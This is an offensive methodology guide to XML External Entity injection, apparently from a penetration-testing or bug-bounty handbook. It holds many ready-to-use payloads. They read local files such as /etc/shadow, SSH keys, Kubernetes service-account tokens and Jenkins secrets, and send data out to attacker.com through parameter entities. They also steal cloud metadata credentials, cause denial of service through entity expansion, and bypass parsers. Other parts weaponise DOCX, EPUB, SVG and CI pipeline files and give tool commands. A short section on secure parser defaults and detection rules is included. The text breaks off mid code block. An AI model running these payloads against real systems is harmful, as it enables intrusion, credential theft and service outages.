# XML External Entity (XXE) Injection

## Shortcut

- Find data entry points that you can use to submit XML data.
- Determine whether the entry point is a candidate for a classic or blind XXE. The endpoint might be vulnerable to classic XXE if it returns the parsed XML data in the HTTP response. If the endpoint does not return results, it might still be vulnerable to blind XXE, and you should set up a callback listener for your tests.
- Try out a few test payloads to see if the parser is improperly configured. In the case of classic XXE, you can check whether the parser is processing external entities. In the case of blind XXE, you can make the server send requests to your callback listener to see if you can trigger outbound interaction.
- Try to exfiltrate a common system file, like /etc/hostname.
- You can also try to retrieve some more sensitive system files, like /etc/shadow or ~/.bash_history.
- If you cannot exfiltrate the entire file with a simple XXE payload, try to use an alternative data exfiltration method.
- See if you can launch an SSRF attack using the XXE.

## Mechanisms

XML External Entity (XXE) is a vulnerability that occurs when XML parsers process external entity references within XML documents. XXE attacks target applications that parse XML input and can lead to:

- Disclosure of confidential files and data
- Server-side request forgery (SSRF)
- Denial of service attacks
- Remote code execution in some cases

```mermaid
flowchart TD
    A[XXE Vulnerability] --> B[File Disclosure]
    A --> C[SSRF]
    A --> D[Denial of Service]
    A --> E[Remote Code Execution]

    B -->|"Access to"| B1[System Files]
    B -->|"Access to"| B2[Application Configs]
    B -->|"Access to"| B3[Database Credentials]

    C -->|"Access to"| C1[Internal Services]
    C -->|"Access to"| C2[Cloud Metadata]
    C -->|"Access to"| C3[External Resources]

    D -->|"Via"| D1[Billion Laughs]
    D -->|"Via"| D2[Quadratic Blowup]
    D -->|"Via"| D3[External Resource DoS]

    E -->|"Via"| E1[PHP Expect]
    E -->|"Via"| E2[Java Deserialization]
```

XXE vulnerabilities arise from XML's Document Type Definition (DTD) feature, which allows defining entities that can reference external resources. When a vulnerable XML parser processes these entities, it retrieves and includes the external resources, potentially exposing sensitive information.

In practice, full remote code execution rarely stems from XXE alone; it typically requires language-specific gadgets—such as PHP's `expect://` wrapper or Java deserialization sinks—which XXE merely helps reach.

```mermaid
sequenceDiagram
    actor A as Attacker
    participant C as Client
    participant S as Server
    participant X as XML Parser
    participant FS as File System

    A->>C: Craft malicious XML with XXE payload
    C->>S: Submit XML document
    S->>X: Pass XML for parsing
    X->>FS: Resolve external entity reference
    FS->>X: Return sensitive file content
    X->>S: Include file content in parsed result
    S->>C: Return response with sensitive data
    C->>A: Attacker views sensitive data
```

Types of XXE attacks include:

- **Classic XXE**: Direct extraction of data visible in responses
- **Blind XXE**: No direct output, but data can be exfiltrated through out-of-band techniques
- **Error-based XXE**: Leveraging error messages to extract data
- **XInclude-based XXE**: Using XInclude when direct DTD access is restricted

```mermaid
flowchart LR
    A[XXE Attack Types] --> B[Classic XXE]
    A --> C[Blind XXE]
    A --> D[Error-based XXE]
    A --> E[XInclude-based XXE]

    B -->|"Direct Output"| B1[Response contains file content]
    C -->|"Out-of-Band"| C1[Data exfiltration via callbacks]
    D -->|"Error Messages"| D1[Data in error output]
    E -->|"XInclude"| E1[Alternative to DTD]
```

## Hunt

### Finding XXE Vulnerabilities

> [!TIP]
> Modern applications often disguise XML parsing behind JSON endpoints or file upload features. Always test for content-type manipulation and examine file format internals.

#### Additional Discovery Methods

- Convert content type from "application/json"/"application/x-www-form-urlencoded" to "application/xml"
- Check file uploads that allow docx/xlsx/pdf/zip - unzip the package and add XML code into the XML files
- Test SVG file uploads for XML injection
- Check RSS feeds functionality for XML injection
- Fuzz for /soap API endpoints
- Test SSO integration points for XML injection in SAML requests/responses

#### Identify XML Injection Points

```mermaid
flowchart TD
    A[XML Injection Points] --> B[API Endpoints]
    A --> C[File Uploads]
    A --> D[Format Conversion]
    A --> E[Legacy Interfaces]
    A --> F[Hidden XML Parsers]
    A --> G[Content-Type Conversion]

    B --> B1[REST APIs]
    B --> B2[GraphQL]

    C --> C1[XML Files]
    C --> C2[DOCX/XLSX]
    C --> C3[SVG Images]
    C --> C4[PDF Files]

    D --> D1[JSON to XML]
    D --> D2[CSV to XML]

    E --> E1[SOAP]
    E --> E2[XML-RPC]
    E --> E3[SAML]

    F --> F1[Hidden Parameters]
    F --> F2[Legacy Code]

    G --> G1[JSON endpoints accepting XML]
```

- **API Endpoints**: Look for endpoints accepting XML data
- **File Uploads**: Features accepting XML-based files (DOCX, SVG, XML, etc.)
- **Format Conversion**: Services converting to/from XML formats
- **Legacy Interfaces**: SOAP web services, XML-RPC
- **Hidden XML Parsers**: Look for parameters that might be processed as XML behind the scenes
- **Content Type Conversion**: Endpoints that accept JSON but may process XML with proper Content-Type

#### Test Basic XXE Patterns

For each potential injection point, test with simple payloads:

- **Classic XXE (file retrieval)**:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root>&xxe;</root>
  ```

  or

  ```xml
  <!DOCTYPE ase [ <!ENTITY %test SYSTEM "http://sib.com/sib"> %test; ]>
  <example>&test;</example>
  ```

- **Blind XXE (out-of-band detection)**:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE test [
    <!ENTITY % xxe SYSTEM "http://attacker-server.com/malicious.dtd">
    %xxe;
  ]>
  <root>test</root>
  ```

- **XInclude attack** (when unable to define a DTD):
  ```xml
  <root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </root>
  ```

#### Billion Laughs Attack Steps

1. Capture the request in your proxy tool
2. Send it to repeater and convert body to XML format
3. Check the Accept header and modify to Application/xml if needed
4. Convert JSON to XML if no direct XML input is possible
5. Insert the billion laughs payload between XML tags
6. Adjust entity references (lol1 to lol9) to control DoS intensity

#### Check Alternative XML Formats

- **SVG files**:

  ```xml
  <?xml version="1.0" standalone="yes"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname" >
  ]>
  <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
  </svg>
  ```

  or

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY test SYSTEM "file:///etc/shadow">
  ]>
  <svg width="500" height="500">
    <circle cx="50" cy="50" r="40" fill="blue" />
    <text font-size="16" x="0" y="16">&test;</text>
  </svg>
  ```

- **DOCX/XLSX files**: Modify internal XML files (e.g., word/document.xml)
- **SOAP messages**: Test XXE in SOAP envelope

#### SAML 2.0 XXE Testing

> [!WARNING]
> SAML implementations are critical security components. XXE in SAML can lead to complete authentication bypass and account takeover.

SAML assertions are prime XXE targets. Test both requests and responses:

**AuthnRequest XXE:**

```xml
<samlp:AuthnRequest
  xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="_xxe" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:AuthnRequest>
```

**Response Assertion XXE:**

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/exfil">]>
  <saml:Assertion>
    <saml:AttributeValue>&xxe;</saml:AttributeValue>
  </saml:Assertion>
</samlp:Response>
```

**Encrypted Assertion XXE (Response Wrapping):**

```xml
<!-- Inject XXE before encryption, Service Provider decrypts and processes -->
<saml:EncryptedAssertion>
  <!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>
  <EncryptedData>...</EncryptedData>
</saml:EncryptedAssertion>
```

**SAML Authentication Bypass via XXE:**

```xml
<!-- Read service provider's private key via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/saml/sp-key.pem">]>
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

#### E-book Format Exploitation (EPUB)

EPUB files are ZIP archives containing XML. Target library management systems and e-reader apps:

```xml
<!-- content.opf inside EPUB -->
<?xml version="1.0"?>
<!DOCTYPE package [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata>
    <dc:title>&xxe;</dc:title>
  </metadata>
</package>
```

**Attack workflow:**

1. Create legitimate EPUB file
2. Extract contents (it's a ZIP)
3. Inject XXE into `META-INF/container.xml` or `content.opf`
4. Re-zip and upload to target (library systems, e-commerce platforms)

#### Office Document XXE (DOCX/XLSX/PPTX)

> [!NOTE]
> Modern Office formats (2007+) are ZIP archives containing XML. Each component file can be a XXE vector.

**DOCX XXE (word/document.xml):**

```bash
# Extract DOCX
unzip document.docx -d document_extracted

# Edit word/document.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>

# Repackage
cd document_extracted
zip -r ../malicious.docx *
```

**XLSX XXE (xl/workbook.xml):**

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1">&xxe;</sheet>
  </sheets>
</workbook>
```

**PPTX XXE (ppt/presentation.xml):**

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://attacker.com/exfil">
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:sldIdLst>
    <p:sldId id="256" r:id="&xxe;"/>
  </p:sldIdLst>
</p:presentation>
```

#### Apple Universal Links XXE

iOS deep linking configuration files:

```xml
<!-- apple-app-site-association generated from XML -->
<?xml version="1.0"?>
<!DOCTYPE config [
  <!ENTITY xxe SYSTEM "file:///var/mobile/Containers/Data/Application/config.plist">
]>
<config>
  <applinks>&xxe;</applinks>
</config>
```

#### RSS/Atom Feed XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    <description>XXE Test Feed</description>
  </channel>
</rss>
```

### Advanced XXE Hunting

#### Parameter Entity Testing

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>
<data>test</data>
```

#### Error-Based XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<data>test</data>
```

#### XXE via Content-Type Manipulation

Try changing Content-Type header from:

```
Content-Type: application/json
```

to:

```
Content-Type: application/xml
```

or:

```
Content-Type: text/xml
```

#### Modern Parser Configurations (2024-2025)

> [!TIP]
> Many modern parsers have secure defaults. Test these configurations to identify misconfigurations or legacy parser usage.

**Default Security Status by Parser:**

| Parser Library           | Language | Secure by Default (2024-2025) | Configuration Required                          |
| ------------------------ | -------- | ----------------------------- | ----------------------------------------------- |
| **libxml2 ≥ 2.13**       | C/C++    | ✅ Yes                        | `XML_PARSE_NO_XXE` enabled by default           |
| **Python ≥ 3.13**        | Python   | ✅ Yes                        | External entities disabled by default           |
| **defusedxml**           | Python   | ✅ Yes                        | Secure wrapper, recommended for all XML parsing |
| **Java 22 (JAXP)**       | Java     | ✅ Yes                        | `FEATURE_SECURE_PROCESSING` enabled by default  |
| **.NET 8**               | C#       | ✅ Yes                        | `DtdProcessing.Prohibit` by default             |
| **Go encoding/xml**      | Go       | ✅ Yes                        | Does not resolve external entities              |
| **PHP libxml (< 8.0)**   | PHP      | ⚠️ Partial                   | Requires `libxml_disable_entity_loader(true)`   |
| **PHP libxml (≥ 8.0)**   | PHP      | ✅ Yes                        | External entities disabled by default           |
| **Node.js libxmljs**     | Node.js  | ⚠️ No                        | Requires explicit configuration                 |
| **Ruby Nokogiri < 1.14** | Ruby     | ⚠️ No                        | Requires explicit configuration                 |
| **Ruby Nokogiri ≥ 1.14** | Ruby     | ✅ Yes                        | `NONET` flag enabled by default                 |

## Chaining and Escalation

### Cloud-Native & Kubernetes XXE

> [!WARNING]
> XXE in cloud-native environments can lead to complete cluster compromise. Service account tokens and cloud credentials are high-value targets.

#### Kubernetes Admission Webhook XXE

ValidatingWebhookConfiguration and MutatingWebhookConfiguration receive XML-formatted requests:

```yaml
# Vulnerable admission webhook
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  annotations:
    # Webhook receives and parses this XML
    config: |
      <?xml version="1.0"?>
      <!DOCTYPE root [
        <!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
      ]>
      <config>&xxe;</config>
```

**Exploitation flow:**

```bash
# 1. Create pod with XXE payload in annotation
kubectl apply -f evil-pod.yaml

# 2. Admission webhook receives XML, processes with vulnerable parser
# 3. Service account token exfiltrated

# 4. Use token for privilege escalation
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat token)"
```

**ConfigMap XXE:**

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: xxe-config
data:
  config.xml: |
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/kubernetes/manifests/kube-apiserver.yaml">]>
    <config>&xxe;</config>
```

**Kubernetes Secret Extraction via XXE:**

```yaml
# Target: Extract secrets from etcd via API server
apiVersion: v1
kind: Pod
metadata:
  name: xxe-secret-exfil
spec:
  containers:
    - name: app
      image: vulnerable-xml-processor:latest
      env:
        - name: XML_CONFIG
          value: |
            <!DOCTYPE root [
              <!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
            ]>
            <config>&xxe;</config>
```

#### CI/CD Pipeline XXE

**Jenkins XML Config Parsing:**

```xml
<!-- config.xml for Jenkins job -->
<?xml version="1.0"?>
<!DOCTYPE project [
  <!ENTITY xxe SYSTEM "file:///var/jenkins_home/secrets/master.key">
]>
<project>
  <description>&xxe;</description>
</project>
```

**GitLab CI Artifact Processing:**

```yaml
# .gitlab-ci.yml
test:
  script:
    - echo '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/gitlab-runner/config.toml">]><root>&xxe;</root>' > report.xml
  artifacts:
    reports:
      junit: report.xml # Parsed by GitLab
```

**GitHub Actions Workflow:**

```yaml
# Vulnerable action that processes XML artifacts
- name: Parse XML Report
  uses: vulnerable/xml-parser@v1
  with:
    xml-file: |
      <?xml version="1.0"?>
      <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///home/runner/.ssh/id_rsa">]>
      <testsuites>&xxe;</testsuites>
```

**CircleCI Test Results:**

```yaml
# .circleci/config.yml
- run:
    name: Generate malicious test results
    command: |
      cat > test-results.xml << 'EOF'
      <?xml version="1.0"?>
      <!DOCTYPE testsuites [
        <!ENTITY xxe SYSTEM "file:///home/circleci/.circleci/config.yml">
      ]>
      <testsuites>&xxe;</testsuites>
      EOF
- store_test_results:
    path: test-results.xml
```

**Maven/Gradle Dependency Confusion:**

```xml
<!-- malicious pom.xml in supply chain -->
<?xml version="1.0"?>
<!DOCTYPE project [
  <!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=">
]>
<project>
  <modelVersion>4.0.0</modelVersion>
  <name>&xxe;</name>
</project>
```

### Parser Misconfigurations

- **DTD Processing Enabled**: XML parsers with DTD processing enabled
- **External Entity Resolution**: Parsers allowing external entity references
- **XInclude Support**: Enabled processing of XInclude statements
- **Missing Entity Validation**: No validation of entity expansion

### File Disclosure via XXE

- **Local File Access**: Reading sensitive system files
  - `/etc/passwd` (Unix user information)
  - `/etc/shadow` (password hashes on Linux)
  - `C:\Windows\system32\drivers\etc\hosts` (Windows hosts file)
  - Application configuration files
  - Source code files
  - Database credentials
  - SSH private keys (`~/.ssh/id_rsa`, `/root/.ssh/id_rsa`)
  - Cloud credentials (`~/.aws/credentials`, `~/.config/gcloud/credentials`)
  - Environment files (`.env`, `config.json`)

### SSRF via XXE

> [!NOTE]
> Cloud metadata services have evolved with security enhancements. Understanding these protections is crucial for modern XXE exploitation.

```mermaid
sequenceDiagram
    actor A as Attacker
    participant S as Vulnerable Server
    participant I as Internal Service
    participant C as Cloud Metadata

    A->>S: Submit XXE payload targeting internal service
    S->>I: Make request to internal service
    I->>S: Return internal service response
    S->>A: Return parsed result with internal data

    A->>S: Submit XXE payload targeting cloud metadata
    S->>C: Request cloud metadata (169.254.169.254)
    C->>S: Return sensitive cloud information
    S->>A: Return parsed result with cloud data
```

- **Internal Network Access**: Scanning internal systems
- **Cloud Metadata Access**: Accessing metadata services

  **AWS IMDSv2** (Token-based, harder via XXE):

  ```xml
  <!-- IMDSv1 still works in legacy environments -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name">]>

  <!-- IMDSv2 requires PUT request for token first -->
  <!-- Most XML parsers can't make PUT requests, limiting XXE exploitation -->
  ```

  **AWS IMDSv1 (Legacy) - Full Exploitation:**

  ```xml
  <!-- Get IAM role name -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
  <root>&xxe;</root>

  <!-- Get IAM credentials (replace YOUR_ROLE_NAME) -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/YOUR_ROLE_NAME">]>
  <root>&xxe;</root>

  <!-- Get instance metadata -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
  <root>&xxe;</root>

  <!-- Get user data (may contain secrets) -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data">]>
  <root>&xxe;</root>
  ```

  **Azure Instance Metadata**:

  ```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]>
  <!-- Requires Metadata: true header, may fail in XXE -->

  <!-- If header requirement bypassed -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/">]>
  ```

  **GCP Metadata v2 (2024+)**:

  ```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>
  <!-- Now requires Metadata-Flavor: Google header -->
  <!-- Classic XXE can't set custom headers, use SSRF chain -->

  <!-- Alternative endpoints -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/project/project-id">]>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/hostname">]>
  ```

  **Workarounds for header-protected metadata:**

  ```xml
  <!-- Use jar:// protocol (Java) to bypass some restrictions -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://metadata.google.internal!/computeMetadata/v1/instance/hostname">]>

  <!-- Or chain with open redirect on same domain -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://vulnerable-app.com/redirect?url=http://169.254.169.254/latest/meta-data/">]>
  ```

#### Cloud-Specific XXE Attacks (2024-2025)

**AWS ECS Task Metadata:**

```xml
<!-- ECS Task Metadata Endpoint v4 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.170.2/v4/credentials">]>
<root>&xxe;</root>

<!-- ECS Task Metadata (full) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.170.2/v4">]>
<root>&xxe;</root>
```

**AWS Lambda Environment Variables:**

```xml
<!-- Access Lambda environment via /proc -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
<root>&xxe;</root>
```

**GCP Compute Engine:**

```xml
<!-- Get project metadata -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/project/?recursive=true">]>

<!-- Get instance metadata -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true">]>

<!-- Get Kubernetes Engine cluster info (if running on GKE) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env">]>
```

**Azure App Service:**

```xml
<!-- Access MSI endpoint -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net">]>

<!-- Get App Service settings -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2020-09-01">]>
```

**Oracle Cloud Infrastructure (OCI):**

```xml
<!-- OCI Instance Metadata -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/opc/v2/instance/">]>

<!-- Get vNIC information -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/opc/v2/vnics/">]>
```

### Denial of Service

- **Billion Laughs Attack**: Exponential entity expansion

  ```xml
  <!DOCTYPE data [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ]>
  <data>&lol3;</data>
  ```

- **Quadratic Blowup Attack**: Large string repeating

  ```xml
  <!DOCTYPE data [
    <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
  ]>
  <data>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</data>
  ```

- **External Resource DoS**: Loading large or never-ending external resources

## Bypass Techniques

### Filter Evasion Techniques

- **Case Variation**:

  ```xml
  <!docTypE test [ <!ENTity xxe SYSTEM "file:///etc/passwd"> ]>
  ```

- **Alternative Protocol Schemes**:

  ```
  file:///
  php://filter/convert.base64-encode/resource=
  gopher://
  jar://
  netdoc://
  data://
  expect://
  ftp://
  ```

- **URL Encoding**:
  ```xml
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:%2F%2F%2Fetc%2Fpasswd"> ]>
  ```

### Parser-Specific Bypasses (2024-2025)

> [!TIP]
> Each parser has unique quirks. Understanding parser-specific behaviors can help bypass security controls.

#### libxml2 Bypasses

```xml
<!-- UTF-7 encoding bypass (older versions) -->
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
<root>&xxe;</root>

<!-- Using CDATA with entity -->
<![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>]]>
<root>&xxe;</root>
```

#### Xerces (Java) Bypasses

```xml
<!-- Using XInclude when DOCTYPE is blocked -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>

<!-- jar:// protocol for SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/META-INF/MANIFEST.MF">]>

<!-- netdoc:// protocol (older Java versions) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]>
```

#### DocumentBuilder (Java) Bypasses

```xml
<!-- Using schema import for XXE -->
<xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <xsd:import namespace="http://attacker.com/evil"
              schemaLocation="http://attacker.com/evil.xsd"/>
</xsd:schema>

<!-- XSLT import for XXE -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:import href="http://attacker.com/evil.xsl"/>
</xsl:stylesheet>
```

#### PHP libxml Bypasses

```xml
<!-- Using PHP wrappers -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>

<!-- expect:// for RCE (if expect extension loaded) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>

<!-- data:// protocol -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">]>

<!-- phar:// for object injection -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "phar:///tmp/evil.phar/test.txt">]>
```

#### .NET XmlReader Bypasses

```xml
<!-- Using XmlUrlResolver with credentials -->
<!DOCTYPE foo SYSTEM "http://user:pass@attacker.com/evil.dtd">

<!-- Using file:/// with UNC paths (Windows) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://\\\\attacker.com\\share\\file">]>
```

### XXE in CDATA Sections

```xml
<![CDATA[<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
]>]]>
```

### XXE via XML Namespace

```xml
<ns1:root xmlns:ns1="http://example.com">
  <ns1:data xmlns:ns1="http://example.com" xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </ns1:data>
</ns1:root>
```

### PHP Wrapper inside XXE

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

## Methodologies

### Tools

> [!TIP]
> Combine automated tools with manual testing for comprehensive XXE detection. Automated tools may miss context-specific vulnerabilities.

#### XXE Detection and Exploitation Tools

**Automated Scanners:**

- **OWASP ZAP**: XML External Entity scanner
  ```bash
  # Command line scanning
  zap-cli active-scan -r http://target.com -s xss,xxe
  ```

- **Burp Suite Pro**: XXE scanner extension
  - Built-in active scanner checks
  - **Burp Suite Pro 2025.2+ ("Burp AI")**: automatically chains scanner-found XXE with out-of-band callbacks for quicker triage.

- **XXEinjector**: Automated XXE testing tool
  ```bash
  # Basic file retrieval
  ruby XXEinjector.rb --host=target.com --path=/api/upload --file=/tmp/request.xml --oob=http --phpfilter

  # Directory enumeration
  ruby XXEinjector.rb --host=target.com --path=/api/upload --file=/tmp/request.xml --enumerate

  # Brute force file paths
  ruby XXEinjector.rb --host=target.com --path=/api/upload --file=/tmp/request.xml --brute=/etc
  ```
  ([https://github.com/enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector))

- **xxeserve**: Out-of-band XXE exploitation server
  ```bash
  # Start HTTP/FTP server for XXE callbacks
  python3 xxeserve.py --server 0.0.0.0 --port 8000

  # With custom DTD
  python3 xxeserve.py --server 0.0.0.0 --port 8000 --dtd evil.dtd
  ```

- **XXE-FTP**: Out-of-band XXE exploitation framework
  ```bash
  # Start FTP server for data exfiltration
  python xxe_ftp.py --ftp-port 2121 --http-port 8080
  ```

- **oxml_xxe**: Tool for testing XXE in OOXML files (docx, xlsx, pptx)
  ```bash
  # Inject XXE into DOCX
  python oxml_xxe.py --input document.docx --output malicious.docx --payload "file:///etc/passwd"

  # Inject into all XML files in DOCX
  python oxml_xxe.py --input document.docx --output malicious.docx --all --payload "http://attacker.com/exfil"
  ```

**Static Analysis:**

- **Semgrep rules (java-xxe, python-xxe, php-xxe)**: static analysis that flags un-hardened XML parser usage.
  ```bash
  # Scan for XXE vulnerabilities
  semgrep --config "p/xxe" /path/to/code

  # Language-specific
  semgrep --config "r/java.xxe" /path/to/java/code
  semgrep --config "r/python.xml" /path/to/python/code
  semgrep --config "r/php.xxe" /path/to/php/code
  ```

- **CodeQL** - GitHub's semantic code analysis
  ```ql
  // Find unsafe XML parsing in Java
  import java
  from XmlParserCall call
  where not call.isSafe()
  select call, "Potentially unsafe XML parsing"
  ```

#### Setup Tools for Out-of-Band Testing

- **Interactsh**: Interaction collection server
  ```bash
  # Self-hosted
  interactsh-server -domain xxe.example.com

  # Client for testing
  interactsh-client
  ```

- **Burp Collaborator**: For out-of-band data detection
  - Built into Burp Suite Professional
  - Automatic payload generation
  - Real-time callback notifications

- **requestrepo / webhook.site**: HTTP request inspection
  ```bash
  # Use in XXE payload
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR_ID.requestrepo.com">]>
  ```

- **DNSlog / dnslog.cn**: DNS-based exfiltration testing
  ```xml
